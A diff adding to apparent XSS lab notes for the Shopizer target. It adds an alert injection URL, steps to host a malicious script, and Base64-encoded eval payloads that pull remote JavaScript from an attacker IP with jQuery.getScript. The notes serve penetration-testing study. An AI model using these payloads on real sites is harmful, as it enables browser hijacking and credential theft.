@@ -96,7 +96,48 @@ setTimeout(function() {
 
 **Use case:** Effective against password managers if the form is filled automatically.
 
+
+## Discovering the Vulnerability
+
+URL:
+
+```shell
+https://target/category/example.html/ref=c:2'+alert(1)+'
+```
+
 ---
+
+## Loading Remote Scripts
+
+Burp:
+
+- Let's access the Site map tool by clicking on Target > Site map.
+-  We can find the JavaScript files Shopizer uses by clicking on http://shopizer:8080 > resources > js.
+
+```shell
+mkdir ~/xss/
+cd ~/xss/
+nano xss.js
+cat xss.js
+    alert('It worked!')
+python3 -m http.server 80
+```
+
+We can use the Decoder tool in Burp Suite to Base64-encode our fetch() call. Let's click on the Decoder tab and paste our payload in the text box. Since we will be Base64-encoding for this part of the payload, we'll click we'll click Encode as ... > Base64.
+
+```shell
+jQuery.getScript('http://192.168.00.000/xss.js')
+```
+
+```shell
+'+eval(atob('alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovLzE5Mi4xNjguNDkuNTEveHNzLmpzJyk='))+'
+```
+
+```shell
+'+btoa(eval(atob('alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovLzE5Mi4xNjguNDkuNTEveHNzLmpzJyk=')))+'
+```
+
+
 
 ## 🚨 Anti-Caching Payload
 
